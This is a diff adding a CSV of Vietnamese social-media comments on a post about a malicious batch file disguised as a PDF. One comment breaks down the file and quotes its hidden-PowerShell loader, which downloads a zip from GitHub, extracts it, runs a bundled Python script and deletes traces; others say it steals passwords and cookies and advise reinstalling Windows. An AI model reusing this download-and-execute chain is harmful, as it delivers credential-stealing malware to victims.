@@ -1,0 +1,52 @@
+﻿comment_id,post_id,user_id,user_name,fullname,content
+1684886902311568,1684882672311991,,skypeaful,Lê Kiến Thức,Nén file lại và gửi link lên đây để nghiên cứu thử xem bạn
+1684932952306963,1684882672311991,,kienvu.154,Kiên Vũ,"1. chạy ngầm PowerShell
+@echo off && start /min powershell.exe -WindowStyle Hidden -Command ...
+2. set SecurityProtocol dùng tls 1.2
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
+3. tải 2 file zip lạ từ github
+(New-Object -TypeName System.Net.WebClient).DownloadFile('https ://github .com/.../Document.zip', 'C:/Users/Public/Document.zip');
+4. giải nén
+Add-Type -AssemblyName System.IO.Compression.FileSystem;
+...
+[System.IO.Compression.ZipFile]::ExtractToDirectory('C:/Users/Public/Document.zip', 'C:/Users/Public/Document');
+5. chạy file vừa giải nén (chúc bạn may mắn 😈)
+C:/Users/Public/Document/python.exe C:/Users/Public/Document/Lib/sim.py;
+6. xóa file zip
+del C:/Users/Public/Document.zip"
+1684940142306244,1684882672311991,,Kazeha247,Kazeha Algothim,"Backup data quan trọng ra r reset win lại đi
+File bat dưới vỏ bọc pdf ạ:))
+
+(Đừng để mấy ồ thợ luộc tiền chỉ vì vài cái nhỏ này nhá nếu ko bt resrt máy sao cho an toàn và sạch thì ib mik ko lấy tiền:)"
+1684922408974684,1684882672311991,,maitruc.chuong.1,Nam Nguyen,https://drive google com /file/d/1RknvrO6uo9_5R2oWD54F2ZOhDVZbEmvX/view các thím xem hộ em với
+1684890668977858,1684882672311991,,adfnav,Lê Minh Quang,.pdf mà lại là file .bat :))
+1684890748977850,1684882672311991,100046168334072,,Đinh Đức Thắng,"Windows Batch file. Thôi xong nhé.
+Cầm búa đập cái máy đi. 🐧
+
+Rút dây mạng/ngắt kết nối Wifi -> Tắt máy -> Cài lại Windows."
+1684906552309603,1684882672311991,,firethanh,Nguyễn Ngọc Thành,"Giờ chắc bên kia có đủ cookie tk/mk của bạn rồi. Đăng xuất, đổi mật khẩu hết các acc có login ở máy. Xong cài lại win là an toàn nhất. Không thì kiểm tra startup xem có file nào lạ rồi xoá file đó đi là ok."
+1684984065635185,1684882672311991,,Dark.Ares.02,Nghĩa Võ,"Em có coi qua code thì nó crawl hết mật khẩu với cookies trong máy rồi, lời khuyên là nên đổi toàn bộ mật khẩu, rồi cài lại win."
+1684924515641140,1684882672311991,,maitruc.chuong.1,Nam Nguyen,note của nó đây ạ
+1684927668974158,1684882672311991,,khanhs1676,Khánh Phạm,Vl pdf.bat 😅
+1684891475644444,1684882672311991,,tien.thanh.52,Tiến Thành,. Hóng nội dụng bro :)
+1685002445633347,1684882672311991,,laitinh2002,Lại Tình,cài lại win đi chứ còn
+1684996025633989,1684882672311991,61553151512104,,Luong Tran,"đã check github thanh niên kia và có repos của miner, mình có ktra qua document thì chỉ là file python thông thường thôi, có lẽ là nó sẽ clone cái miner rồi cho chạy ở máy của bạn, nếu miner thì chỉ cần cài lại win sạch là đc rồi nhé"
+1684886065644985,1684882672311991,1851601017,,Linh Ngoc Trinh,FBI sẽ liên hệ bạn sớm thôi
+1684958288971096,1684882672311991,,minhkhang.nguyen.7121,Tân Nguyễn,"Github nó private
+Nhưng file document.zip thì nó public, file khá lớn
+Em online bằng đt nên ko down file về xem nó là cái quái gì trong đó, view trực tiếp trên github thì đt ko view nổi"
+1684938018973123,1684882672311991,,duong.dangdinh.1,Dưỡng Đặng,Hà Văn Chương nó báo ngay rồi ở phía sau là windows bat file
+1684897808977144,1684882672311991,,anhtuanlqd,Nguyen Anh Tuan,"tắt máy, tháo ổ cứng. cắm ổ cứng vào một máy khác để check hàng (nếu cần giữ data), không thì tốt nhất là trắng tinh. trước khi làm gì nhớ gửi file kia lên đây để anh em học hỏi mánh khoé xem nó làm gì :D"
+1684899818976943,1684882672311991,,an.nam.1804,Nam An,Khó nói
+1684912972308961,1684882672311991,,aitiniubi,AiTiNiuBi,sao file từ 30/7 mà giờ mới đăng khéo admin duyệt muộn rồi
+1684888072311451,1684882672311991,,luvideez,Quân,"chuột phải, chọn edit xem file bat ấy nội dung gì nào bạn :)). Người lạ gửi file bat mà cũng dám mở thì giỏi rồi:("
+1684895922310666,1684882672311991,,Quocthai93,Vương Quốc Thái,Liệm
+1685002572300001,1684882672311991,,thuancoihg,Trần Đức Thuận,"Mất hết tài khoản các page nhé. Bài này nó hay chơi vào quản trị viên các công ty thiết kế nội thất, bán hàng online..."
+1684908838976041,1684882672311991,,halinh.1609,Ha Thu Ngo,Thôi xong phim. Giống vụ gửi cv .pdf nhưng bị hack
+1684896838977241,1684882672311991,,imNgocSon,Nguyễn Ngọc Sơn,"Chuột phải chọn Edit xem nó là cái gì nào, rồi chụp lên đây. Nhanh nhanh nhanh!!!"
+1684912875642304,1684882672311991,,ngthuhien.89,Thanh Luu,Thôi xong
+1684909495642642,1684882672311991,,Em1na.Akag4wa,Lê Tuấn Hùng,Cài Windows lại ngayyyyyy
+1684956868971238,1684882672311991,,missingand,Đặng Trung,"Tắt máy , cài lại win lẹ ko tất cả về nơi dĩ vãng.nhưng mà nên đổi hết mk mail miếc đi nha😆"
+1684915022308756,1684882672311991,,littlebluemoon1,Đoàn Đức Thanh,Ong an cut roi
+1684896238977301,1684882672311991,,dangtuong.76114,Đặng Tường,Cook
+1684954658971459,1684882672311991,,tuananh.cafevn,Tuấn Anh Phạm,Mở open with bằng notepad rồi paste lên đây. Nghe các thánh ... phán nhé. Haha. Nhanh trí cứ ngắt mạng ngay đi. Rồi ... Tính tiếp
